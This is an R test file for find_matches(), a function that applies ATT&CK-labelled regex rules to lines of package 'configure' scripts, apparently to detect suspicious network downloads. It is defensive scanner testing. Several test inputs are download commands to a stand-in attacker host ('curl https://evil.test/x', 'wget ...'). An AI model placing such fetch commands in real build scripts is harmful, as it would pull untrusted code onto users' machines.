rules <- load_rules()

# A one-row regex rules frame with the given match, so tests can exercise
# find_matches() without depending on what the shipped rules happen to match.
regex_rule <- function(regex, name = "probe", message = "m", attck = "T1041") {
  data.frame(name = name, version = "0.1.0", message = message,
             attck = attck, regex = regex, stringsAsFactors = FALSE)
}

# structure --------------------------------------------------------------------
test_that("find_matches() returns matches and errors frames with fixed columns", {
  res <- find_matches("curl https://evil.test/x", rules$matches, "configure")
  expect_named(res, c("matches", "errors"))
  expect_named(res$matches,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck"))
  expect_named(res$errors, c("step", "file_context", "rule", "message"))
})

test_that("find_matches() reports the rule, message, and ATT&CK labels of the match", {
  res <- find_matches("curl https://evil.test/x", rules$matches, "configure")
  expect_equal(res$matches$rule, "curl")
  expect_equal(res$matches$file_context, "configure")
  expect_equal(res$matches$attck,
               rules$matches$attck[rules$matches$name == "curl"])
  expect_equal(res$matches$message,
               rules$matches$message[rules$matches$name == "curl"])
})

test_that("find_matches() with no rules finds nothing and raises nothing", {
  for (empty in list(NULL, rules$matches[0L, , drop = FALSE])) {
    res <- find_matches("curl https://evil.test/x", empty, "configure")
    expect_equal(nrow(res$matches), 0L)
    expect_equal(nrow(res$errors), 0L)
  }
})

test_that("find_matches() rejects a non-character argument", {
  expect_error(find_matches(42L, rules$matches, "configure"), "is.character")
})

# positions --------------------------------------------------------------------
test_that("find_matches() reports the line and starting column of each match", {
  res <- find_matches(c("#!/bin/sh", "echo hi", "  curl -s https://evil.test/x"),
                    regex_rule("curl"), "configure")
  expect_equal(res$matches$line_number,   3L)
  expect_equal(res$matches$column_number, 3L)
})

test_that("find_matches() reports every match on a line, not just the first", {
  res <- find_matches("curl a && curl b", regex_rule("curl"), "configure")
  expect_equal(nrow(res$matches), 2L)
  expect_equal(res$matches$line_number,   c(1L, 1L))
  expect_equal(res$matches$column_number, c(1L, 11L))
})

test_that("find_matches() counts columns in characters, not bytes", {
  # Two multi-byte characters precede the match, so a byte offset would be 7.
  res <- find_matches("éé && curl x", regex_rule("curl"), "configure")
  expect_equal(res$matches$column_number, 7L)
})

test_that("find_matches() matches case-sensitively", {
  res <- find_matches(c("CURL x", "Curl x", "curl x"), regex_rule("curl"),
                    "configure")
  expect_equal(res$matches$line_number, 3L)
})

test_that("find_matches() applies every rule to the lines", {
  res <- find_matches(c("curl https://evil.test/a", "wget https://evil.test/b"),
                    rules$matches, "configure")
  expect_setequal(res$matches$rule, c("curl", "wget"))
  expect_equal(nrow(res$errors), 0L)
})

test_that("find_matches() uses PCRE, so lookaround in a rule is honoured", {
  res <- find_matches(c("curl x", "libcurl x"),
                    regex_rule("(?<=^|[^[:alnum:]_-])curl"), "configure")
  expect_equal(res$matches$line_number, 1L)
})

# empty and unmatched input ----------------------------------------------------
test_that("find_matches() finds nothing in lines with no match", {
  res <- find_matches(c("#!/bin/sh", "echo configuring"), rules$matches, "configure")
  expect_equal(nrow(res$matches), 0L)
  expect_equal(nrow(res$errors), 0L)
})

test_that("find_matches() handles an empty file's lines", {
  for (empty in list(character(0L), "")) {
    res <- find_matches(empty, rules$matches, "configure")
    expect_equal(nrow(res$matches), 0L)
    expect_equal(nrow(res$errors), 0L)
  }
})

# errors -----------------------------------------------------------------------
test_that("find_matches() records an invalid regex against its rule and continues", {
  both <- rbind(regex_rule("(unclosed", name = "broken"), regex_rule("curl"))
  res  <- find_matches("curl https://evil.test/x", both, "configure")

  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$step, "find_matches")
  expect_equal(res$errors$rule,  "broken")
  expect_equal(res$errors$file_context, "configure")
  # The sound rule was still evaluated after the broken one failed.
  expect_equal(res$matches$rule, "probe")
})
